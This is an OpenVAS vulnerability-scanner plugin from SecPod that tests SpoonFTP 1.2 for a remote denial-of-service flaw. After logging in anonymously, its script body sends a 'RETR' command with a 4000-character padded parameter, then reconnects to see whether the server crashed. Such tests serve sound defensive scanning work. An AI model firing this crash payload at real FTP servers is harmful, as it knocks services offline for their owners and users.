###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_spoonftp_retr_cmd_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# SpoonFTP 'RETR' Command Remote Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_solution = "No solution or patch is available as of 22nd March, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.softpedia.com/progDownload/SpoonFTP-Download-49969.html";

tag_impact = "Successful exploitation will allow attackers to cause a denial of service.
  Impact Level: Application";
tag_affected = "Softpedia SpoonFTP 1.2, other versions may also be affected.";
tag_insight = "The flaw is due to an error while parsing 'RETR' command, which
  can be exploited to crash the FTP service by sending 'RETR' command with
  an overly long parameter.";
tag_summary = "The host is running SpoonFTP Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(900274);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-03-25 15:52:06 +0100 (Fri, 25 Mar 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("SpoonFTP 'RETR' Command Remote Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17021/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/46952/info");
  script_xref(name : "URL" , value : "http://www.softpedia.com/progDownload/SpoonFTP-Download-49969.html");
  script_description(desc);
  script_summary("Determine if SpoonFTP is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "solution" , value : tag_solution);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application installed
banner = get_ftp_banner(port:ftpPort);
if("220 SpoonFTP" >!< banner){
  exit(0);
}

## Open the socket on port 21. if it fails exit
soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

## Check for the default user name
user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

## check for the default password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = string("anonymous");
}

##  Exist if not able to login
ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!ftplogin){
  exit(0);
}

## Send the crafted data
send(socket:soc1, data:string("RETR ", crap(length: 4000, data:'/\\'),'\r\n'));

## Close the socket after sending exploit
ftp_close(socket:soc1);

sleep (2);

## Open the socket to confirm FTP server is alive
soc2 = open_sock_tcp(ftpPort);
if(!soc2){
  security_hole(ftpPort);
  exit(0);
}
ftp_close(socket:soc2);
